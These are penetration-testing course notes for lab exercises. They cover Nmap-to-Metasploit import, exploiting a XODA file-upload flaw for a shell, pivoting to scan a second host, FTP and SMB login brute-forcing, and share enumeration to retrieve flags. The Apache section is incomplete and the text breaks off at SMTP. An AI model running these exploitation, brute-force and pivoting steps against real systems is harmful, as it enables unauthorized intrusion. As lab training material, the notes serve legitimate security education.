# Enumeration

<br>

## 1. Introduction

This course covers essential techniques for identifying and analyzing network services in penetration testing. You'll learn to use the **Nmap Scripting Engine (NSE)** for advanced, automated service detection and enumeration. Key topics include scanning **SSH, FTP, SMB, and SMTP** to uncover service versions, detect vulnerabilities, and gather critical information for further testing.

<br>

## 2. Importing Nmap Scan Results Into MSF

Nmap  can be used to enumerate the services running on **open ports** as well as the **operating system** running on the target system. We can output the results of our Nmap scan in to a format that can be imported into MSF for vulnerability detection and exploitation.

1) **Nmap file output**

```shell
nmap -Pn -sV -O <ip_address> -oX <file_name>
cat <file_name>
```

2) **Start Metasploit and import the XML file**

```shell
# Start Metasploit and check the database status.
service postgresql start && msfconsole
db_status

# Before importing scan results into the Metasploit Framework database, we first create a new workspace to organize the data, then proceed with the import.
workspace 
workspace -a <workspace_name>
db_import  <path_file>

# Confirm date has been inported.
hosts
services
```

<br>

## 3. Run Nmap within Metasploit

We can also initiate an Nmap scan directly from the Metasploit Framework. The MSF console allows us to run an Nmap scan and automatically save the results to the database.

```shell
# We can create another workspace.
workspace -a Nmap_MSF
# Now we can provide the various scan options that we want.
db_nmap -Pn -sV -O <target_IP>
# The results have been automatically imported within Metasploit Framework database for this workspace. The workspaces are to be considered different regardless if they scanned the same target.
```

## 4. T1046 Network Service Scanning
 
In Metasploit, **Auxiliary Modules** are tools and functions that provide various scanning, reconnaissance, and other support functionalities. Common Auxiliary Functions:
- **Port Scanning**: These modules can scan for open ports on target machines using Nmap or internal scanning techniques.
- **Service Enumeration**: Identify services running on specific ports (e.g. FTP, SSH, HTTP).
- **Vulnerability Scanning**: While not directly an exploit, auxiliary modules can be used to check for the presence of certain vulnerabilities.
- **Brute Forcing**: Attempt to brute-force login credentials for services like SSH or FTP.

Network Service Scanning is a part of the exploitation as well as the post-exploitation phase and deals with identifying the services running on remote hosts.

**T1046 (Network Service Scanning)** is a technique defined in the **MITRE ATT&CK framework**, used to describe a type of reconnaissance activity where an attacker scans a network to discover open services or active ports on systems. The goal of this technique is to identify potential entry points into the network by gathering information about the services that are running and exposed to the internet or internal network. 

**Objective:** Identify the ports open on the second target machine using appropriate Metasploit modules. 

**Vulnerability Information:**
- Vulnerability: XODA File Upload Vulnerability
- Metasploit module: exploit/unix/webapp/xoda_file_upload

**Exploit the vulnerable service and gain access to the system.**

```shell
ping -c 1 <target_IP>
nmap -Pn -sV -O -v <target_IP>
# Check the HTTP content hosted on port 80 of the target machine.
curl <target_IP>
# Start msfconsole
service postgresql start && msfconsole
# Since the vulnerability is related to XODA file upload, we can search the module for XODA.
use exploit/unix/webapp/xoda_file_upload
set RHOSTS <target_IP>
set TARGETURI /
# The webaplication in this case is hosted at the root of the web server "/".
set LHOST <local_IP>
exploit

# Start a command shell and identify the IP address range of the second target machine.
shell
ifconfig # note the IP address
exit
```

1. **Ports scan on the second target machine using NMAP**

```shell
# Interacts with the active Metasploit session
sessions -i <session_ID>
# Uploads the local nmap binary from your machine to the /tmp directory on the target system
upload /root/static-binaries/nmap /tmp/nmap
shell
# Grants execute permission to the nmap file, allowing it to be run as a program
chmod +x ./nmap
# Run Nmap on the target to scan the ports
./nmap -p- <second_target_IP>
```

2. **Ports scan on the second target machine using a BASH SCRIPT**

```shell
# Using the script provided at [https://catonmat.net/tcp-port-scanner-in-bash] as a reference, create a bash script to scan the first 1000 ports.
# Save the script as bash-port-scanner.sh

#!/bin/bash
for port in {1..1000}; do
 timeout 1 bash -c "echo >/dev/tcp/$1/$port" 2>/dev/null && echo "port $port is open"
done

# Interacts with the active Metasploit session
sessions -i <session_ID>
# Upload the bash script on the target machine
upload /root/bash-port-scanner.sh /tmp/bash-port-scanner.sh
shell
# Grants execute permission to the script file, allowing it to be run as a program
chmod +x ./bash-port-scanner.sh
# Run the script on the target to scan the ports
./bash-port-scanner.sh <second_target_IP>
```

3. **Ports scan on the second target machine using METASPLOIT MODULE**

```shell
# From Meterpreter session
run autoroute  -s <second-network-interface-on-first-target-machine>
# Enabling Metasploit to route traffic through the current session..
background
sessions

search portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS <ip-victim-2>
set VERBOSE false
set PORTS 1-1000
exploit
```

## 5. Service Enumeration

**Service Enumeration** is a process in which specific details about network services running on a target system are gathered. This step is a key part of the reconnaissance phase in penetration testing or ethical hacking, allowing security professionals to understand what services are exposed and potentially vulnerable. By identifying the services and versions running on specific ports, attackers or testers can pinpoint known vulnerabilities or misconfigurations.

<br>

### 5.1. FTP Enumeration

**FTP** (File Transfer Protocol) is a protocol that uses TCP port 21 and is used to facilitate file sharing between a server and client/clients. FTP operates in a client-server architecture, where the client initiates a connection to the server to perform file operations.

**Objective:** Your task is to perform FTP enumeration with Metasploit. The target machine will be accessible at demo.ine.local.

```shell
# Using NMAP
ping -c 1 <target_IP>
nmap -p 21 -sV -O <target_IP>

# Start Metasploit and create a new workspace.
service  postgresql  start && msfconsole
workspace -a FTP_Enum

# Port Scan with Metasploit
search tcp portscan
use auxiliary/scanner/portscan/tcp
set RHOSTS <target_IP>
run

# FTP Metasploit Modules
search type:auxiliary  name:ftp
use auxiliary/scanner/ftp/ftp_version
set RHSOTS <target_IP>

use auxiliary/scanner/ftp/anonymous
set RHOSTS <target_IP>
run

use auxiliary/scanner/ftp/ftp_login
show options
set RHOSTS <target_IP>
set PASS_FILE <location> # /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set USER_FILE <location> # /usr/share/metasploit-framework/data/wordlists/common_users.txt
set VERBOSE false
run

# Run FTP and get the Flag
ftp <target_IP>  # Enter the credentials
ls
get secret.txt
exit
ls
cat secret.txt
```

<br>

### 5.2. SMB Enumeration

**SMB** (Server Message Block) is a network file sharing protocol that is used to facilitate the sharing of files and peripherals between computers on a local network (LAN). Performing SMB server reconnaissance involves identifying and extracting information from SMB servers on a network.

**Objective:** Answer the following questions:

1. **Find the default TCP ports used by smbd.**

`smbd` is a service that is part of the Samba suite. It is responsible for handling NetBIOS name resolution and broadcast-based network browsing on networks that use the Windows SMB (Server Message Block) protocol.

```shell
nmap -Pn -sV -O <target_IP> # TCP ports are 139 and 445
```

2. **Find the default UDP ports used by smbd.**

```shell
nmap -sU --top-ports 25 <target_IP> # In this case ports are 137, 138
```

3. **What is the WorkGroup name of samba server?**

```shell
nmap -Pn -sV -O <target_IP> # workgroup: <group_name>
```

4. **Find the exact version of samba server by using appropriate Nmap script.**

```shell
# Search for smb scripts.
ls -al /usr/share/nmap/scripts | grep -e "smb"
nmap --script smb-os-discovery <target_IP>
```

5. **Find the exact version of samba server by using smb_version metasploit module.**

```shell
service postgresql start && msfconsole
use auxiliary/scanner/smb/smb_version
set RHOSTS <target_IP>
exploit # e.g. Samba 4.3.11-Ubuntu
```

6. **What is the NetBIOS computer name of samba server? Use appropriate nmap scripts.**

```shell
nmap --script smb-os-discovery.nse -p <port_number> <target_IP> # port no. tipically 445
```

7. **Find the NetBIOS computer name of samba server using nmblookup**

```shell
nmblookup --help
nmblookup -A <target_IP>
```

8. **Using smbclient determine whether anonymous connection (null session) is allowed on the samba server or not.**

```shell
smbclient -L <target_IP> -N
# Anonymous connection is allowed since shares are displayed without requirement of password.
```

9. **Using rpcclient determine whether anonymous connection (null session) is allowed on the samba server or not.**

```shell
rpcclient -U "" -N <target_IP>
```

### 5.3. SMB CTF

```shell
# Start Metasploit and create a new workspace.
workspace -a SMB_Enum
# Set a default IP for RHOSTS.
setg RHOSTS <target_IP>

# Use the following modules
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_enumshares
# The results shows shares for specific users, meaning we can potentially access these shares if we have or can obtain legitimate credentials.

# Anonymous connection is allowed since shares are displayed without requirement of password.

use auxiliary/scanner/smb/smb_login
set USER_FILE /usr/share/metasploit-framework/data/wordlists/unix_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

# Now we can try and check out the various shares and access and try access the files within these shares. For this purpose we can use a utility called SMB client, not part of the metasploit framework.

# New terminal
smbclient -L \\\\<target_IP>\\ -U admin # Enter the password.
smbclient  \\\\<target_IP>\\<share_name> -U admin # Enter the password.
ls
cd secret # or flag
get flag
exit
ls
cat flag
```

<br>

### 5.4. Apache Enumeration

**Apache** is one of the most widely used open-source web servers in the world, developed and maintained by the Apache Software Foundation. The main ports used for web servers are:
 - Port 80 (HTTP - HyperText Transfer Protocol)
- Port 443 (HTTPS - HyperText Transfer Protocol Secure)
- Port 8080 often used as an alternative to port 80 for HTTP traffic
- Port 8443 commonly used for HTTPS traffic as an alternative to port 443, often in environments where multiple HTTPS services need to run on the same machine

Apache enumeration is a crucial step in the reconnaissance phase of a penetration test, where the goal is to gather as much information as possible about the Apache web server being targeted. 

**Objective:** Run the following auxiliary modules against the target (victim-1):

```shell
# Start Metasploit and create a new workspace.
service postgresql start && msfconsole
workspace -a Web_Enum
setg RHOSTS <target_IP>

sessions -i 1 # sessions 1
/bin/bash -i
cd /
cat flag
```

<br>

### 5.7. SMTP Enumeration

An **SMTP** (Simple Mail Transfer Protocol) server is a mail server that sends and receives emails using the SMTP protocol. It's responsible for sending, receiving, and relaying outgoing mail between email senders and recipients.

**Tools:** Nmap, telnet, nc, Metasploit Framework

1. **What is the SMTP server name and banner.**

```shell
